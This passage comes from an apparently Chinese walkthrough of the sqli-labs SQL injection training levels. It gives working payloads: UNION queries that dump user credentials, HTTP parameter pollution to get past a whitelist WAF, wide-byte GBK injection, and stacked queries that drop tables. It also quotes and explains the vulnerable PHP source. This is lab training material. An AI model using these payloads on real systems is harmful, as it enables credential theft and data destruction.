class="string">&#x27;)ununion%0Aselection%0Aselect%0A1,(select%0Agroup_concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,id,&#x27;</span>.<span class="string">&#x27;,username,&#x27;</span>.<span class="string">&#x27;,password,&#x27;</span>.<span class="string">&#x27;)%0Afrom%0Asecurity.users),3||(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查数据</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="29关：有WAF-对参数进行高效过滤"><a href="#29关：有WAF-对参数进行高效过滤" class="headerlink" title="29关：有WAF 对参数进行高效过滤"></a><strong>29关：有WAF 对参数进行高效过滤</strong></h3><p>‘  闭合</p>
<p>绕过的方法是 **HPP (HTTP Parameter Pollution)**，也就是 HTTP 参数污染。我们注入两个同名的参数 id，第一个参数用于绕过 WAF，第二个参数用于注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">2</span> <span class="operator">/</span><span class="operator">/</span>两个参数</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">2</span><span class="string">&#x27; order by 99999-- - //查字段数</span></span><br><span class="line"><span class="string">往下是和第一关一样的payload （简单）</span></span><br></pre></td></tr></table></figure>



<p>源码如下，源码通过了 java_implimentation() 方法获取到了 id 参数。接着源码使用 GET 方法获取 id 参数，并通过  whitelist() 方法判断参数是否合法。注意我们在上面传入了 2 个同名参数，使用 GET 方法获取到的是后面的参数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">源码:</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> take the variables </span><br><span class="line">if(isset($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">      $qs <span class="operator">=</span> $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">      $hint <span class="operator">=</span> $qs;</span><br><span class="line">      $id1 <span class="operator">=</span> java_implimentation($qs);</span><br><span class="line">      $id <span class="operator">=</span> $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">      <span class="operator">/</span><span class="operator">/</span>echo $id1;</span><br><span class="line">      whitelist($id1);</span><br><span class="line"> </span><br><span class="line">      <span class="operator">/</span><span class="operator">/</span> connectivity </span><br><span class="line">      $<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">      $<span class="keyword">result</span> <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">      $<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line">      if($<span class="type">row</span>)</span><br><span class="line">      &#123;</span><br><span class="line">            echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;;	</span><br><span class="line">	    echo <span class="string">&#x27;Your Login name:&#x27;</span>. $<span class="type">row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	    echo <span class="string">&#x27;Your Password:&#x27;</span> .$<span class="type">row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	    echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> </span><br><span class="line">      &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">java_implimentation() 方法</span><br><span class="line"></span><br><span class="line">该方法将 <span class="keyword">GET</span> 读入的整行参数使用 explode() 方法对 “<span class="operator">&amp;</span>” 进行分割，返回一个分割后的数组。接着方法通过 substr() 方法提取对 “<span class="operator">&amp;</span>” 分割后的第一个元素的前 <span class="number">2</span> 个字符，若这 <span class="number">2</span> 个字符是 “id”，则再次使用 substr() 方法提取等号后面的值返回。注意该方法提取的是 <span class="number">2</span> 个同名变量中的第一个，因此它无法对第二个同名变量进行操作</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>WAF implimentation <span class="keyword">with</span> a whitelist approach..... <span class="keyword">only</span> allows input <span class="keyword">to</span> be Numeric.</span><br><span class="line"><span class="keyword">function</span> whitelist($input)</span><br><span class="line">&#123;</span><br><span class="line">      $<span class="keyword">match</span> <span class="operator">=</span> preg_match(&quot;/^\d+$/&quot;, $input);</span><br><span class="line">      if($<span class="keyword">match</span>)</span><br><span class="line">      &#123;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo &quot;you are good&quot;;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span><span class="keyword">return</span> $<span class="keyword">match</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;	</span><br><span class="line">            header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo &quot;you are bad&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">whitelist() 方法</span><br><span class="line"></span><br><span class="line">该方法使用正则表达式判断传入的参数是否是数字，若不是数字则跳转页面。由于注入 <span class="number">2</span> 个同名参数时，java_implimentation() 方法返回的参数是第一个 id 参数，此时这个过滤就被我们绕过了</span><br></pre></td></tr></table></figure>

<h3 id="30关：”-闭合，有WAF-高效过滤"><a href="#30关：”-闭合，有WAF-高效过滤" class="headerlink" title="30关：” 闭合，有WAF　高效过滤"></a><strong>30关：” 闭合，有WAF　高效过滤</strong></h3><p>使用参数污染</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">2</span>&quot; order by 3-- -　／／查字段数</span><br><span class="line">往下和29关一样</span><br></pre></td></tr></table></figure>



<h3 id="31关：”-闭合，有WAF"><a href="#31关：”-闭合，有WAF" class="headerlink" title="31关：”) 闭合，有WAF"></a><strong>31关：”) 闭合，有WAF</strong></h3><p>使用参数污染，用第二个参数进行注入，同30关</p>
<h3 id="32关：单引号闭合，单引号参数被转义"><a href="#32关：单引号闭合，单引号参数被转义" class="headerlink" title="32关：单引号闭合，单引号参数被转义"></a><strong>32关：单引号闭合，单引号参数被转义</strong></h3><p>使用宽字节注入</p>
<p>当数据库的编码采用 <strong>GBK 国标码</strong>时，虽然单引号还是会加上反斜杠从而被转义，但是 “%df” 会和反斜杠的 URL 编码 “%5C” 闭合，从而构成 GBK 国标码中的汉字“連”，使得用于转义的反斜杠被我们“吃掉”了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; //宽字节注入</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">返回</span></span><br><span class="line"><span class="string">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1�\&#x27;&#x27; LIMIT 0,1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br><span class="line">这种操作是由于 GBK 国标码是双字节表示一个汉字，因此导致了反斜杠和其他的字符共同表示为一个汉字。这可以让数据库的 <span class="keyword">SQL</span> 查询了正确的参数(汉字)，从而可以使用 <span class="keyword">UNION</span> 语句进行注入</span><br></pre></td></tr></table></figure>

<p>开始注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; order by 3-- - //查字段数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1%df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">-- - //查显示位</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,@@version,database()-- - //查版本与当前数据库</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1%df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(schema_name)<span class="keyword">from</span> information_schema.schemata),database()<span class="comment">-- - //查所有数据库</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=0x7365637572697479),3-- - //查表名注意此处数据库名要用十六进制 (HEX) 编码替代，避免单引号的使用</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1%df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="number">0x7365637572697479</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span>),<span class="number">3</span><span class="comment">-- - //查字段，同样要使用hex</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,(select group_concat(0x7e,id,0x2e,username,0x2e,password)from security.users),3-- - //查数据</span></span><br></pre></td></tr></table></figure>



<p>可以看到 id 参数传入时，会先经过 check_addslashes() 函数，该函数起到的作用应该就是转义字符了。注意网页会把数据库的编码改成 GBK，给宽字节注入提供了可能性</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line">$id <span class="operator">=</span> check_addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;</span><br><span class="line"> </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> connectivity </span><br><span class="line">mysql_query(&quot;SET NAMES gbk&quot;);</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span> <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"> </span><br><span class="line">if($<span class="type">row</span>)</span><br><span class="line">&#123;</span><br><span class="line">      echo <span class="string">&#x27;&lt;font color= &quot;#00FF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">      echo <span class="string">&#x27;Your Login name:&#x27;</span>. $<span class="type">row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">      echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">      echo <span class="string">&#x27;Your Password:&#x27;</span> .$<span class="type">row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">      echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">      echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      print_r(mysql_error());</span><br><span class="line">      echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">check_addslashes() 函数</span><br><span class="line"></span><br><span class="line">该函数使用正则表达式匹配字符，将 <span class="string">&#x27; 转义为 &#x27;</span> ， 将 \ 转义为 \ ，将 &quot; 转义为 &quot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">      $string <span class="operator">=</span> preg_replace(<span class="string">&#x27;/&#x27;</span>. preg_quote(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, &quot;\\\\\\&quot;, $string);      <span class="operator">/</span><span class="operator">/</span>把\\变成斜体，再使用\\\\\\去替换</span><br><span class="line">      backslash</span><br><span class="line">      $string <span class="operator">=</span> preg_replace(<span class="string">&#x27;/\&#x27;</span><span class="operator">/</span>i<span class="string">&#x27;, &#x27;</span>\\\<span class="string">&#x27;&#x27;</span>, $string);                           <span class="operator">/</span><span class="operator">/</span><span class="keyword">escape</span> single quote <span class="keyword">with</span> a backslash</span><br><span class="line">      $string <span class="operator">=</span> preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, &quot;\\\&quot;&quot;, $string);                            //escape double quote with a backslash</span><br><span class="line"> </span><br><span class="line">      return $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preg_replace() 搜索第3参数中匹配第1参数的部分，以第2参数进行替换</span><br><span class="line"></span><br><span class="line">preg_quote() 需要参数 str 并向其中 每个正则表达式语法中的字符前增加一个反斜线。 这通常用于你有一些运行时字符串 需要作为正则表达式进行匹配的时候。</span><br><span class="line">正则表达式特殊字符有： . \ + * ? [ ^ ] $ ( ) &#123; &#125; = ! &lt; &gt; | : -</span><br></pre></td></tr></table></figure>



<h3 id="33关：与32一模一样"><a href="#33关：与32一模一样" class="headerlink" title="33关：与32一模一样"></a><strong>33关：与32一模一样</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">      $string <span class="operator">=</span> addslashes($string);    </span><br><span class="line">      <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_addslashes() 函数</span><br><span class="line"></span><br><span class="line">此处的过滤函数是 addslashes() 函数，用于在预定义字符之前添加反斜杠，预定字符有单引号、双引号和反斜杠</span><br></pre></td></tr></table></figure>





<h3 id="34关：POST-‘-闭合-宽字节注入"><a href="#34关：POST-‘-闭合-宽字节注入" class="headerlink" title="34关：POST  ‘ 闭合 宽字节注入"></a><strong>34关：POST  ‘ 闭合 宽字节注入</strong></h3><p>要通过 BP 操作 payload 就行了，和32关一样</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE71.png">    </p>
<h3 id="35关：数字型注入"><a href="#35关：数字型注入" class="headerlink" title="35关：数字型注入"></a><strong>35关：数字型注入</strong></h3><p>判断闭合，以下方式均闭合失败。可能是数字型注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27;-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1%df&#x27;</span>)<span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27;))-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1%df&quot;-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1%df&quot;)-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1%df&quot;))-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1 and 1=1-- -正常</span></span><br><span class="line"><span class="string">?id=1 and 1=2-- -异常</span></span><br><span class="line"><span class="string">验证了它为数字型</span></span><br><span class="line"><span class="string">由于数值型注入不涉及任何编码问题，因此任何转义操作都形同虚设</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1 union select 1,2,3-- - //查显示位</span></span><br><span class="line"><span class="string">和第一关一样</span></span><br></pre></td></tr></table></figure>



<h3 id="36关：’-闭合-宽字节注入"><a href="#36关：’-闭合-宽字节注入" class="headerlink" title="36关：’ 闭合 宽字节注入"></a><strong>36关：’ 闭合 宽字节注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">-- - //查显示位</span></span><br><span class="line">下面的payload 与<span class="number">32</span>关一样</span><br></pre></td></tr></table></figure>



<h3 id="37关：POST-‘-闭合-宽字节注入"><a href="#37关：POST-‘-闭合-宽字节注入" class="headerlink" title="37关：POST   ‘ 闭合 宽字节注入"></a><strong>37关：POST   ‘ 闭合 宽字节注入</strong></h3><p>和34关完全一样</p>
<h3 id="38关：’-闭合-堆叠注入’"><a href="#38关：’-闭合-堆叠注入’" class="headerlink" title="38关：’ 闭合 堆叠注入’"></a><strong>38关：’ 闭合 堆叠注入’</strong></h3><p>所谓<strong>堆叠注入</strong>就是在原语句后加上分号，从而闭合前面的内容作为第一条 SQL 语句,这是毁灭性的漏洞，骇客可以肆意操作数据库。这一关可以使用第一关的 payload 过。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;CREATE TABLE a LIKE users;--+ //创建一张和users 一样的表</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>;<span class="keyword">INSERT</span> <span class="keyword">INTO</span> a <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;<span class="comment">--+ //将user里的数据插入a表中</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;DELETE FROM a;--+//删除a表中的数据</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>;<span class="keyword">DROP</span> <span class="keyword">TABLE</span> a;<span class="comment">--+//删除a表</span></span><br></pre></td></tr></table></figure>

<p>可以看到源码使用了 <strong>mysqli_multi_query()</strong> 函数，该函数可以执行多个 MySQL 语句。之前的 Less 使用的是 <strong>mysql_query() 函数</strong>，该函数只执行一条 MySQL 查询</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line">if (mysqli_multi_query($con1, $<span class="keyword">sql</span>))</span><br><span class="line">&#123;    </span><br><span class="line">      <span class="comment">/* store first result set */</span></span><br><span class="line">      if ($<span class="keyword">result</span> <span class="operator">=</span> mysqli_store_result($con1))</span><br><span class="line">      &#123;</span><br><span class="line">            if($<span class="type">row</span> <span class="operator">=</span> mysqli_fetch_row($<span class="keyword">result</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                  echo <span class="string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">                  printf(&quot;Your Username is : %s&quot;, $<span class="type">row</span>[<span class="number">1</span>]);</span><br><span class="line">                  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">                  printf(&quot;Your Password is : %s&quot;, $<span class="type">row</span>[<span class="number">2</span>]);</span><br><span class="line">                  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">                  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>mysqli_free_result($<span class="keyword">result</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/* print divider */</span></span><br><span class="line">      if (mysqli_more_results($con1))</span><br><span class="line">      &#123;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>printf(&quot;-----------------\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="operator">/</span><span class="operator">/</span>while (mysqli_next_result($con1));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">      echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      print_r(mysqli_error($con1));</span><br><span class="line">      echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="39关：数字型-堆叠注入"><a href="#39关：数字型-堆叠注入" class="headerlink" title="39关：数字型 堆叠注入"></a><strong>39关：数字型 堆叠注入</strong></h3><p>参考38关</p>
<h3 id="40关：’-闭合-堆叠注入"><a href="#40关：’-闭合-堆叠注入" class="headerlink" title="40关：’) 闭合 堆叠注入"></a><strong>40关：’) 闭合 堆叠注入</strong></h3><p>参考38关</p>
<h3 id="41关：数字型-堆叠注入"><a href="#41关：数字型-堆叠注入" class="headerlink" title="41关：数字型  堆叠注入"></a><strong>41关：数字型  堆叠注入</strong></h3><p>参考38关</p>
<h3 id="42关：POST-密码处-‘-闭合-二次注入，堆叠注入"><a href="#42关：POST-密码处-‘-闭合-二次注入，堆叠注入" class="headerlink" title="42关：POST 密码处 ‘ 闭合  二次注入，堆叠注入"></a><strong>42关：POST 密码处 ‘ 闭合  二次注入，堆叠注入</strong></h3><p>页面和24关的二次注入一样</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">用户处使用万能密码，失败</span><br><span class="line"><span class="number">1</span> <span class="keyword">OR</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>#</span><br><span class="line">a<span class="string">&#x27; OR 1 = 1#</span></span><br><span class="line"><span class="string">a&#x27;</span>) <span class="keyword">OR</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>#</span><br><span class="line">a<span class="string">&#x27;)) OR 1 = 1#</span></span><br><span class="line"><span class="string">a&quot; OR 1 = 1#</span></span><br><span class="line"><span class="string">a&quot;) OR 1 = 1#</span></span><br><span class="line"><span class="string">a&quot;)) OR 1 = 1#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">密码处使用万能密码，成功，说明用户处存在过滤</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line"></span><br><span class="line">然后开始堆叠注入  参考<span class="number">38</span>关</span><br><span class="line">a<span class="string">&#x27; or 1 = 1;CREATE TABLE a LIKE users;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>;<span class="keyword">INSERT</span> <span class="keyword">INTO</span> a <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;#</span><br><span class="line"></span><br><span class="line">a<span class="string">&#x27; or 1 = 1;DELETE FROM a;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>;<span class="keyword">DROP</span> <span class="keyword">TABLE</span> a;#</span><br></pre></td></tr></table></figure>



<p>username 字段使用 mysqli_real_escape_string() 函数进行转义，而 password 字段没有任何防御措施</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$username <span class="operator">=</span> mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line">$password <span class="operator">=</span> $_POST[&quot;login_password&quot;];</span><br><span class="line"> </span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">if (<span class="variable">@mysqli</span>_multi_query($con1, $<span class="keyword">sql</span>))</span><br><span class="line">&#123;</span><br><span class="line">      <span class="comment">/* store first result set */</span></span><br><span class="line">      if($<span class="keyword">result</span> <span class="operator">=</span> 